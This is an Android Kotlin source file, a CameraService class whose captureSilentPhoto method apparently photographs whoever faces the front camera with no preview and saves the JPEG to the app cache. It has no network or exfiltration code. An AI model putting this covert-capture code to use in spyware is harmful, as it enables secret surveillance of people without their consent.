package com.lucifax.lucifax_cdm

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.Surface
import java.io.File
import java.io.FileOutputStream

class CameraService(private val context: Context) {
    private val TAG = "CameraService"
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null

    companion object {
        @Volatile
        var isCapturing = false
    }

    interface CameraCallback {
        fun onPhotoCaptured(path: String)
        fun onError(error: String)
    }

    fun captureSilentPhoto(callback: CameraCallback) {
        if (isCapturing) {
            callback.onError("Camera is already capturing")
            return
        }
        isCapturing = true

        startBackgroundThread()
        val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            // Find front camera ID
            var frontCameraId: String? = null
            for (id in manager.cameraIdList) {
                val characteristics = manager.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraMetadata.LENS_FACING_FRONT) {
                    frontCameraId = id
                    break
                }
            }

            if (frontCameraId == null) {
                callback.onError("Front camera not found")
                stopBackgroundThread()
                isCapturing = false
                return
            }

            // Set up ImageReader
            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
            imageReader?.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: run {
                    callback.onError("Acquired image is null")
                    closeCamera()
                    stopBackgroundThread()
                    isCapturing = false
                    return@setOnImageAvailableListener
                }
                
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()

                try {
                    val file = File(context.cacheDir, "silent_capture.jpg")
                    val output = FileOutputStream(file)
                    output.write(bytes)
                    output.close()
                    Log.d(TAG, "Photo saved: ${file.absolutePath}")
                    callback.onPhotoCaptured(file.absolutePath)
                } catch (e: Exception) {
                    callback.onError("Save error: ${e.message}")
                } finally {
                    closeCamera()
                    stopBackgroundThread()
                    isCapturing = false
                }
            }, backgroundHandler)

            // Open Camera
            manager.openCamera(frontCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession(callback)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                    callback.onError("Camera disconnected")
                    closeCamera()
                    stopBackgroundThread()
                    isCapturing = false
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    cameraDevice = null
                    callback.onError("Camera device error: $error")
                    closeCamera()
                    stopBackgroundThread()
                    isCapturing = false
                }
            }, backgroundHandler)

        } catch (e: SecurityException) {
            callback.onError("SecurityException: ${e.message}")
            closeCamera()
            stopBackgroundThread()
            isCapturing = false
        } catch (e: Exception) {
            callback.onError("Exception: ${e.message}")
            closeCamera()
            stopBackgroundThread()
            isCapturing = false
        }
    }

    private fun createCaptureSession(callback: CameraCallback) {
        val device = cameraDevice ?: run {
            callback.onError("Camera device is null during session creation")
            closeCamera()
            stopBackgroundThread()
            isCapturing = false
            return
        }
        val reader = imageReader ?: run {
            callback.onError("ImageReader is null during session creation")
            closeCamera()
            stopBackgroundThread()
            isCapturing = false
            return
        }
        try {
            val outputSurfaces = listOf(reader.surface)
            device.createCaptureSession(outputSurfaces, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session
                    try {
                        val captureBuilder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        captureBuilder.addTarget(reader.surface)
                        captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)

                        session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
                            override fun onCaptureCompleted(
                                session: CameraCaptureSession,
                                request: CaptureRequest,
                                result: TotalCaptureResult
                            ) {
                                super.onCaptureCompleted(session, request, result)
                                Log.d(TAG, "Capture Completed")
                            }
                        }, backgroundHandler)
                    } catch (e: Exception) {
                        callback.onError("Session capture error: ${e.message}")
                        closeCamera()
                        stopBackgroundThread()
                        isCapturing = false
                    }
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    callback.onError("Capture session configuration failed")
                    closeCamera()
                    stopBackgroundThread()
                    isCapturing = false
                }
            }, backgroundHandler)
        } catch (e: Exception) {
            callback.onError("Create capture session error: ${e.message}")
            closeCamera()
            stopBackgroundThread()
            isCapturing = false
        }
    }

    private fun closeCamera() {
        try {
            captureSession?.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error closing capture session: ${e.message}")
        }
        captureSession = null

        try {
            cameraDevice?.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error closing camera device: ${e.message}")
        }
        cameraDevice = null

        try {
            imageReader?.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error closing image reader: ${e.message}")
        }
        imageReader = null
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground")
        backgroundThread?.start()
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
        } catch (e: InterruptedException) {
            Log.e(TAG, "Stop background thread interrupted: ${e.message}")
        }
        backgroundThread = null
        backgroundHandler = null
    }
}
